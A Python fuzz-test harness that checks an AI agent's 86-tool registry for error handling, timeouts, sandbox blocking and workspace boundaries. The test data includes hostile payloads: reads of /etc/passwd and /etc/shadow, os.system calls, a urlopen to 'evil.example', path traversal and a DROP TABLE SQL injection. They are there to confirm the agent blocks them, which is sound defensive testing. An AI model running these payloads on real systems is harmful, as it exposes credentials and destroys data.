"""B06 Tools Registry Fuzz Harness.

For each of 86 @tool registrations, exercise five input types via
ToolRegistry.dispatch():

  1. normal              — one reasonable fixture input satisfying schema.
  2. schema_violation    — drop a required field (or pass garbage types).
  3. timeout             — monkeypatch handler to async-sleep past declared timeout.
  4. sandbox_violation   — run_python style tools only: malicious payload blocked.
  5. boundary            — workspace/path or sql injection or idempotency depending on tool.

Outputs rows to .tmp/qa_B06/matrix.csv. Failure repros go to B06_failures/.

Pass rule: tool returns a well-formed response (stringified JSON or plain string).
Error responses are ACCEPTABLE — the ask is "accurate error", not "success".
Critical failure = raw Python exception bubbles up past dispatch, or a security
assertion is violated.
"""

from __future__ import annotations

import asyncio
import csv
import json
import os
import sys
import time
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src"))

from ds_agent.agent.factory import import_all_tools  # noqa: E402
import importlib  # noqa: E402

# Silence structlog on Windows to keep output readable
os.environ.setdefault("PYTHONIOENCODING", "utf-8")

import_all_tools()
for _m in [
    "ds_agent.tools.learning_tools",
    "ds_agent.tools.portfolio_tools",
]:
    importlib.import_module(_m)

from ds_agent.tools.registry import ToolRegistry  # noqa: E402
from ds_agent.tools.path_utils import set_active_workspace  # noqa: E402

# Set an active workspace so that *path_bound* tools (file_ops, data_loader
# family) evaluate Path.is_relative_to() against a known root. Without this,
# their check is a no-op and the boundary test would be meaningless.
_WORKSPACE = Path(__file__).resolve().parent / "workspace"
_WORKSPACE.mkdir(parents=True, exist_ok=True)
set_active_workspace(_WORKSPACE)

OUT_DIR = Path(__file__).resolve().parent
FAIL_DIR = Path(__file__).resolve().parents[2] / "Docs" / "qa_run_2026-04-17" / "B06_tools_registry" / "B06_failures"
FAIL_DIR.mkdir(parents=True, exist_ok=True)


# ---------------------------------------------------------------------------
# Fixture inputs per tool (normal case). Keys are tool names; values are dicts
# matching the tool's JSON schema. Tools absent from this table fall back to
# an auto-generated minimal fixture that fills required keys with sentinels.
# ---------------------------------------------------------------------------
FIXTURES: dict[str, dict[str, Any]] = {
    # Matches actual registered schema (see .tmp/qa_B06/live_full.json).
    "ab_test": {"action": "list"},
    "add_assumption": {"task_id": "t-fuzz", "statement": "A", "rationale": "R", "risk_level": "low"},
    "advance_work_object_phase": {"work_object_id": "wo-fuzz", "to_phase": "in_progress"},
    "ask_user": {"question": "proceed?"},
    "build_delivery_pack": {"task_id": "t-fuzz"},
    "close_task_contract": {"task_id": "t-fuzz", "expected_version": 1, "closing_note": "done"},
    "close_work_object": {"work_object_id": "wo-fuzz", "reason": "done"},
    "compare_runs": {"run_a_id": "run-a", "run_b_id": "run-b"},
    "create_calendar_event": {"work_object_id": "wo-fuzz", "summary": "Fuzz", "start": "2026-04-17T10:00:00Z", "end": "2026-04-17T11:00:00Z"},
    "create_git_pr": {"title": "fuzz", "body": "x", "head": "feat"},
    "create_jira_ticket": {"summary": "fuzz", "description": "x", "project": "FUZ"},
    "create_task_contract": {"session_id": "s-fuzz", "contract_type": "analysis", "business_goal": "g", "goal_brief": "b", "required_deliverables": ["report"]},
    "create_work_object": {"task_contract_id": "c-fuzz", "title": "fuzz", "request_source": "slack", "requestor_id": "u1", "requestor_display": "User One", "original_text": "hi"},
    "dashboard_spec": {"metrics": ["revenue"]},
    "data_loader": {"file_path": "workspace/sample.csv"},
    "data_profiler": {"file_path": "workspace/sample.csv"},
    "describe_table_trust": {"fqtns": ["gold.orders"]},
    "dispatch_delivery": {"task_id": "t-fuzz"},
    "distributed_exec": {"code": "print('d')", "backend": "dask", "data_path": "workspace/sample.csv"},
    "drift_monitor": {},  # All optional.
    "evaluate_model": {"code": "print('e')", "model_path": "workspace/model.pkl", "test_data_path": "workspace/test.csv", "target_column": "target"},
    "execute_code": {"code": "print('hello from fuzz')"},
    "feature_engineer": {"code": "print('f')", "input_path": "workspace/in.csv", "output_path": "workspace/out.csv"},
    "generate_deployment": {"code": "print('g')", "model_path": "workspace/model.pkl", "output_dir": "workspace/deploy"},
    "generate_report": {"code": "print('r')", "project_dir": "workspace/proj", "output_path": "workspace/report.html"},
    "get_learning_item": {"item_id": "li-1"},
    "get_post_deploy_status": {"model_id": "m-1"},
    "get_review_artifacts": {"run_id": "run-a"},
    "get_review_verdict": {"verdict_id": "v-1"},
    "get_task_contract": {"task_id": "t-fuzz"},
    "get_verifier_shadow_comparison": {"comparison_id": "cmp-1"},
    "get_work_object": {"work_object_id": "wo-fuzz"},
    "get_work_object_timeline": {"work_object_id": "wo-fuzz"},
    "lineage_capture": {"action": "list"},
    "link_external_resource": {"work_object_id": "wo-fuzz", "system": "slack", "resource_type": "channel", "resource_id": "C123"},
    "list_delivery_log": {"task_id": "t-fuzz"},
    "list_deprecations": {},
    "list_files": {"directory": "workspace"},
    "list_learning_inbox": {},
    "list_my_contracts": {"session_id": "s-fuzz"},
    "list_my_portfolio": {},
    "list_promotions": {},
    "list_verifier_shadow_comparisons": {},
    "list_work_objects": {},
    "load_semantic_pack": {},
    "lookup_term": {"query": "churn rate"},
    "memory_search": {"query": "anomaly detection"},
    "memory_store": {"content": "Fuzz note", "memory_type": "session"},
    "notebook_generate": {"code_blocks": ["print('x')"], "output_path": "workspace/nb.ipynb"},
    "open_git_pr": {"work_object_id": "wo-fuzz", "repo": "org/fuzz", "base_branch": "main", "files": {"README.md": "hi"}, "title": "fuzz", "body_md": "body"},
    "pause_task": {"entry_id": "e-1"},
    "policy_check": {"action": "deploy"},
    "post_to_slack": {"work_object_id": "wo-fuzz", "message": "hi"},
    "publish_confluence_page": {"work_object_id": "wo-fuzz", "title": "Fuzz", "body_markdown": "hi"},
    "publish_notion_page": {"work_object_id": "wo-fuzz", "title": "Fuzz", "body_markdown": "hi"},
    "read_file": {"file_path": "workspace/sample.txt"},
    "record_delivery_pack": {"task_id": "t-fuzz"},
    "record_review_artifact": {"run_id": "run-a", "skill_name": "anomaly_detection", "summary": "ok", "artifact": {"path": "workspace/a.ipynb"}},
    "record_review_verdict": {"task_id": "t-fuzz", "category": "quality", "result": "approved", "reviewer": "u1", "summary": "ok"},
    "register_feature": {"yaml_uri": "features/churn.yaml"},
    "render_delivery_artifact": {"task_id": "t-fuzz", "artifact_id": "a-1", "analysis": {"summary": "x"}, "output_dir": "workspace/out"},
    "render_stakeholder_artifact": {"artifact": {"title": "Fuzz"}, "analysis": {"summary": "x"}, "output_dir": "workspace/art"},
    "request_monitoring": {"entry_id": "e-1", "metric_name": "latency_p95"},
    "request_promotion": {"candidate_run_id": "r1", "target_stage": "staging", "approvers": ["u1"], "rollback_plan_ref": "doc://plan"},
    "resume_task": {"entry_id": "e-1", "run_id": "r-1"},
    "review_learning_item": {"item_id": "li-1", "decision": "accept"},
    "rollback_promotion": {"item_id": "pr-1"},
    "run_eda": {"code": "print('e')", "data_path": "workspace/sample.csv"},
    "run_verifier": {"task_id": "t-fuzz", "session_id": "s-fuzz", "task_type": "analysis", "business_goal": "g"},
    "schema_inspect": {"action": "list"},
    "search_sessions": {"query": "anomaly"},
    "semantic_query": {"question": "What is MAU?"},
    "send_email": {"work_object_id": "wo-fuzz", "to": "a@example.com", "subject": "Fuzz"},
    "send_to_slack": {"message": "hi"},
    "set_sla": {"entry_id": "e-1", "priority": "high"},
    "skill_list": {},
    "skill_search": {"query": "anomaly"},
    "skill_view": {"skill_name": "anomaly_detection"},
    "slide_generate": {"sections": [{"title": "s1", "bullets": ["b1"]}]},
    "sql_query": {"sql": "SELECT 1"},
    "standing_order": {"action": "list"},
    "train_model": {"code": "print('t')", "data_path": "workspace/sample.csv", "target_column": "target"},
    "update_task_contract": {"task_id": "t-fuzz", "expected_version": 1, "patch": {"business_goal": "new"}},
    "verify_assumption": {"task_id": "t-fuzz", "entry_id": "e-1", "expected_version": 1},
    "web_search": {"query": "churn rate"},
    "write_file": {"file_path": "workspace/scratch.txt", "content": "fuzz"},
}


# Tools to use for sandbox-violation input — only code-exec-like tools.
SANDBOX_TOOLS = {"execute_code", "distributed_exec"}

MALICIOUS_PAYLOADS = [
    "import socket\ns = socket.socket()",
    "open('/etc/passwd').read()",
    "import os; os.system('whoami')",
    "import urllib.request; urllib.request.urlopen('http://evil.example')",
    "__import__('os').system('whoami')",
]


def auto_fixture(entry) -> dict[str, Any]:
    """Fallback fixture for tools not enumerated in FIXTURES."""
    props = (entry.parameters or {}).get("properties") or {}
    required = (entry.parameters or {}).get("required") or []
    out: dict[str, Any] = {}
    for k in required:
        spec = props.get(k, {})
        t = spec.get("type", "string")
        if t == "string":
            out[k] = "fuzz"
        elif t == "integer":
            out[k] = 1
        elif t == "number":
            out[k] = 1.0
        elif t == "boolean":
            out[k] = False
        elif t == "array":
            out[k] = []
        elif t == "object":
            out[k] = {}
        else:
            out[k] = "fuzz"
    return out


def schema_violation_input(entry) -> dict[str, Any]:
    """Produce an input that violates the schema: drop a required key, or use bad types."""
    required = list((entry.parameters or {}).get("required") or [])
    props = (entry.parameters or {}).get("properties") or {}
    # Always inject an unknown key to test the unknown-keys path.
    bad = {"__unexpected_fuzz_key__": "bad"}
    if required:
        # Drop first required key — send all others with correct types but add the bad key.
        # If only one required key exists, we simply send the unknown key to trigger missing.
        fx = FIXTURES.get(entry.name) or auto_fixture(entry)
        missing = required[0]
        for k, v in fx.items():
            if k != missing:
                bad[k] = v
    # If no required keys, we just send unknown key (most tools declare properties).
    if not required and not props:
        # Tool with no schema → pick a different violation: pass a type-mismatched payload.
        bad = {"__unexpected_fuzz_key__": 12345}
    return bad


async def dispatch_with_timeout(tool_name: str, args: dict[str, Any]) -> tuple[str, str, str]:
    """Dispatch and capture result.

    Returns (outcome, error_class, evidence) where outcome in {pass, fail, skipped}.
    """
    try:
        result = await ToolRegistry.dispatch(tool_name, args)
    except Exception as exc:  # critical — dispatch itself should not raise.
        return ("fail", type(exc).__name__, f"raised from dispatch: {exc!r}")
    # dispatch returns a str. Accept anything string.
    if not isinstance(result, str):
        return ("fail", "NonStringResult", f"type={type(result).__name__}")
    # Is it JSON parse-safe? Not required (plain strings ok), but if it *looks*
    # like JSON (starts with { or [), must parse.
    stripped = result.lstrip()
    if stripped.startswith("{") or stripped.startswith("["):
        try:
            json.loads(result)
        except Exception as exc:
            return ("fail", "InvalidJSON", f"{exc!r}; head={result[:200]!r}")
    return ("pass", "", result[:500])


async def run_normal(entry) -> tuple[str, str, str]:
    fx = FIXTURES.get(entry.name) or auto_fixture(entry)
    return await dispatch_with_timeout(entry.name, fx)


async def run_schema_violation(entry) -> tuple[str, str, str]:
    fx = schema_violation_input(entry)
    outcome, err, evi = await dispatch_with_timeout(entry.name, fx)
    if outcome != "pass":
        return outcome, err, evi
    # The registry should have caught this. Check the returned error JSON.
    try:
        parsed = json.loads(evi) if evi.lstrip().startswith("{") else None
    except Exception:
        parsed = None
    if parsed and "error" in parsed and "Invalid arguments for" in str(parsed.get("error", "")):
        return ("pass", "ToolValidationError", evi[:300])
    # Tools with permissive schemas may accept the unknown key — that's a soft pass
    # as long as no RuntimeError was raised. Mark as pass with note.
    return ("pass", "permissive_schema", evi[:300])


async def run_timeout(entry) -> tuple[str, str, str]:
    """Replace the handler with a slow coroutine and ensure dispatch enforces timeout.

    Strategy: stash the original handler, substitute an async sleeping longer
    than entry.timeout, run, then restore. We override timeout to 1s to keep the
    test fast (still longer than an immediate fail, and dispatch uses
    entry.timeout, not a 1s cap — so we temporarily lower entry.timeout too).
    """
    original_handler = entry.handler
    original_timeout = entry.timeout

    async def slow_handler(**_kw):
        await asyncio.sleep(3)  # longer than 1s below
        return "should-not-reach"

    entry.handler = slow_handler
    entry.timeout = 1
    try:
        fx = FIXTURES.get(entry.name) or auto_fixture(entry)
        t0 = time.monotonic()
        result = await ToolRegistry.dispatch(entry.name, fx)
        elapsed = time.monotonic() - t0
        # Must not actually wait 3s; must return timeout error.
        if elapsed > 2.5:
            return ("fail", "NoTimeoutEnforcement", f"elapsed={elapsed:.2f}s result={result[:120]}")
        if "timed out" not in result.lower() and "timeout" not in result.lower():
            return ("fail", "NoTimeoutError", f"result={result[:200]}")
        return ("pass", "TimeoutError", f"elapsed={elapsed:.2f}s; {result[:200]}")
    except Exception as exc:
        return ("fail", type(exc).__name__, repr(exc))
    finally:
        entry.handler = original_handler
        entry.timeout = original_timeout


async def run_sandbox_violation(entry) -> tuple[str, str, str]:
    """For execute_code / distributed_exec, each malicious payload must be blocked."""
    if entry.name not in SANDBOX_TOOLS:
        return ("skipped", "NotCodeExec", "tool does not execute arbitrary code")
    results = []
    all_blocked = True
    for payload in MALICIOUS_PAYLOADS:
        try:
            r = await ToolRegistry.dispatch(entry.name, {"code": payload})
        except Exception as exc:
            results.append(f"RAISED:{type(exc).__name__}:{exc}")
            all_blocked = False
            continue
        # Block indicator: error JSON with "Security check failed" OR non-zero return w/ blocked msg.
        rlow = r.lower()
        blocked_hit = (
            "security check failed" in rlow
            or "blocked" in rlow
            or "error" in rlow
        )
        if not blocked_hit:
            all_blocked = False
            results.append(f"NOT_BLOCKED payload={payload[:40]!r} r={r[:120]}")
        else:
            results.append(f"BLOCKED payload={payload[:40]!r}")
    if all_blocked:
        return ("pass", "SandboxBlock", "; ".join(results)[:500])
    return ("fail", "SandboxBypass", "; ".join(results)[:800])


async def run_boundary(entry) -> tuple[str, str, str]:
    """Boundary test: per-tool specialisation.

    - file ops / data_loader: workspace path escape → must be rejected.
    - sql_query: SQL injection payload → must be rejected.
    - profiling/query: idempotency (two runs equal).
    - Else: call with an "edge" variant and accept any non-raising result.
    """
    name = entry.name

    # Workspace path bound tools: tools that explicitly enforce the workspace
    # boundary via path_utils.is_within_workspace(). DS-exec tools (run_eda,
    # train_model, etc.) defer path-safety to the sandbox-level code_security
    # which activates at open()/import-time; testing them with an unused path
    # string is meaningless, so they are NOT in this map.
    PATH_TOOLS = {
        "data_loader": "file_path",
        "data_profiler": "file_path",
        "read_file": "file_path",
        "write_file": "file_path",
        "list_files": "directory",
    }
    if name in PATH_TOOLS:
        bad_path = "../../../etc/shadow"
        key = PATH_TOOLS[name]
        fx = dict(FIXTURES.get(name) or auto_fixture(entry))
        fx[key] = bad_path
        if name == "write_file":
            fx["content"] = "x"
        r = await ToolRegistry.dispatch(name, fx)
        # Accept: returns an error (JSON with "error") and does NOT expose /etc/shadow contents
        low = r.lower()
        if "outside workspace" in low or "not within" in low or "error" in low or "not allowed" in low or "invalid" in low or "denied" in low or "path" in low and "workspace" in low:
            return ("pass", "PathBoundRejected", r[:300])
        # If tool returned success, we have a boundary bypass.
        # HOWEVER some tools may simply not find the file → "No such file" is still safe.
        if "no such file" in low or "not found" in low or "does not exist" in low:
            return ("pass", "FileNotFound-safe", r[:300])
        return ("fail", "PathBoundBypass", r[:400])

    # DS sandbox tools: boundary = sandbox should reject code that opens traversal.
    DS_SANDBOX_TOOLS = {"run_eda", "train_model", "feature_engineer", "evaluate_model", "generate_deployment", "generate_report", "data_profiler"}
    if name in DS_SANDBOX_TOOLS:
        # Build a fixture that forces the code to read /etc/shadow — this is not
        # one of the 5 explicit sandbox payloads; it is the workspace-boundary
        # variant. code_security layer 1 does NOT flag `open("../../../etc/shadow")`
        # as a regex match (no os.system, no subprocess), so we rely on the
        # *code_security* file-I/O rule. If the tool allows this code to run
        # and successfully reads the file, that is a boundary bypass.
        # In practice on Windows, /etc/shadow does not exist so the open will
        # raise FileNotFoundError — we accept that as a safe outcome.
        fx = dict(FIXTURES.get(name) or auto_fixture(entry))
        # Pick a code parameter if present.
        if "code" in fx:
            fx["code"] = "open('../../../etc/shadow').read()"
        r = await ToolRegistry.dispatch(name, fx)
        low = r.lower()
        if "security check failed" in low or "error" in low or "blocked" in low or "no such file" in low or "filenotfounderror" in low or "permission" in low:
            return ("pass", "SandboxOrMissingFile", r[:300])
        return ("fail", "TraversalOpenSucceeded", r[:400])

    if name == "sql_query":
        payload = "; DROP TABLE users; --"
        r = await ToolRegistry.dispatch(name, {"sql": payload})
        low = r.lower()
        if "safety violation" in low or "error" in low or "rejected" in low:
            return ("pass", "SQLInjectionBlocked", r[:400])
        return ("fail", "SQLInjectionExecuted", r[:400])

    # Idempotency class: call twice and compare.
    IDEMPOTENT = {
        "data_profiler", "run_eda", "semantic_query", "lookup_term",
        "describe_table_trust", "schema_inspect", "compare_runs",
        "get_work_object", "list_work_objects", "get_task_contract",
        "list_my_contracts", "get_review_verdict", "get_review_artifacts",
        "get_post_deploy_status", "skill_list", "skill_view", "skill_search",
        "memory_search", "search_sessions", "list_learning_inbox",
        "list_promotions", "list_deprecations", "list_my_portfolio",
        "list_delivery_log", "list_verifier_shadow_comparisons",
        "get_work_object_timeline", "get_learning_item",
    }
    if name in IDEMPOTENT:
        fx = FIXTURES.get(name) or auto_fixture(entry)
        r1 = await ToolRegistry.dispatch(name, fx)
        r2 = await ToolRegistry.dispatch(name, fx)
        # Strip non-deterministic substrings (timestamps) if any — accept loose equality
        def _strip_noise(s: str) -> str:
            return s.replace("\r", "")
        if _strip_noise(r1) == _strip_noise(r2):
            return ("pass", "Idempotent", "equal outputs")
        # Some tools include timestamps — accept if structure equal and only timestamp differs.
        # We still count differing as fail to force inspection.
        return ("fail", "NonIdempotent", f"r1!=r2; r1={r1[:200]}; r2={r2[:200]}")

    # Default boundary: pass empty-ish edge input and ensure dispatch doesn't crash.
    return await dispatch_with_timeout(name, FIXTURES.get(name) or auto_fixture(entry))


async def main() -> int:
    tool_names = sorted(ToolRegistry.list_tools())
    assert len(tool_names) == 86, f"expected 86 tools, got {len(tool_names)}"

    rows: list[dict[str, Any]] = []
    critical = 0
    sandbox_blocks = 0
    covered = 0

    for name in tool_names:
        entry = ToolRegistry._tools[name]
        covered += 1

        # 1. normal
        o, e, v = await run_normal(entry)
        rows.append({"tool_name": name, "input_type": "normal", "outcome": o, "error_class": e, "evidence": v})
        if o == "fail":
            critical += 1
            _save_repro(name, "normal", entry, FIXTURES.get(name) or auto_fixture(entry), v)

        # 2. schema_violation
        o, e, v = await run_schema_violation(entry)
        rows.append({"tool_name": name, "input_type": "schema_violation", "outcome": o, "error_class": e, "evidence": v})
        if o == "fail":
            critical += 1
            _save_repro(name, "schema_violation", entry, schema_violation_input(entry), v)

        # 3. timeout
        o, e, v = await run_timeout(entry)
        rows.append({"tool_name": name, "input_type": "timeout", "outcome": o, "error_class": e, "evidence": v})
        if o == "fail":
            critical += 1
            _save_repro(name, "timeout", entry, {}, v)

        # 4. sandbox_violation (only code-exec tools; others skipped)
        o, e, v = await run_sandbox_violation(entry)
        rows.append({"tool_name": name, "input_type": "sandbox_violation", "outcome": o, "error_class": e, "evidence": v})
        if o == "pass" and name in SANDBOX_TOOLS:
            sandbox_blocks += 5
        if o == "fail":
            critical += 1
            _save_repro(name, "sandbox_violation", entry, {"payloads": MALICIOUS_PAYLOADS}, v)

        # 5. boundary
        o, e, v = await run_boundary(entry)
        rows.append({"tool_name": name, "input_type": "boundary", "outcome": o, "error_class": e, "evidence": v})
        if o == "fail":
            critical += 1
            _save_repro(name, "boundary", entry, {}, v)

    # Write CSV
    out_csv = Path(__file__).resolve().parents[2] / "Docs" / "qa_run_2026-04-17" / "B06_tools_registry" / "B06_tools_fuzz.csv"
    with out_csv.open("w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["tool_name", "input_type", "outcome", "error_class", "evidence"])
        writer.writeheader()
        for r in rows:
            writer.writerow(r)
    # Also write a summary JSON
    summary = {
        "total_tools": covered,
        "total_cells": len(rows),
        "critical_failures": critical,
        "sandbox_blocks": sandbox_blocks,
        "outcome_counts": {
            "pass": sum(1 for r in rows if r["outcome"] == "pass"),
            "fail": sum(1 for r in rows if r["outcome"] == "fail"),
            "skipped": sum(1 for r in rows if r["outcome"] == "skipped"),
        },
    }
    (OUT_DIR / "summary.json").write_text(json.dumps(summary, indent=2))
    print(json.dumps(summary, indent=2))
    return 0


def _save_repro(name: str, input_type: str, entry, args: dict, evidence: str) -> None:
    safe_name = "".join(c if c.isalnum() or c in "_-" else "_" for c in name)
    path = FAIL_DIR / f"{safe_name}_{input_type}.py"
    content = f'''"""Failure repro for tool={name!r}, input_type={input_type!r}."""
import asyncio, sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "src"))
from ds_agent.agent.factory import import_all_tools
import importlib
import_all_tools()
for _m in ["ds_agent.tools.learning_tools", "ds_agent.tools.portfolio_tools"]:
    importlib.import_module(_m)
from ds_agent.tools.registry import ToolRegistry

ARGS = {args!r}

async def main() -> None:
    r = await ToolRegistry.dispatch({name!r}, ARGS)
    print(r)

if __name__ == "__main__":
    asyncio.run(main())
# evidence captured: {evidence!r}
'''
    path.write_text(content, encoding="utf-8")


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
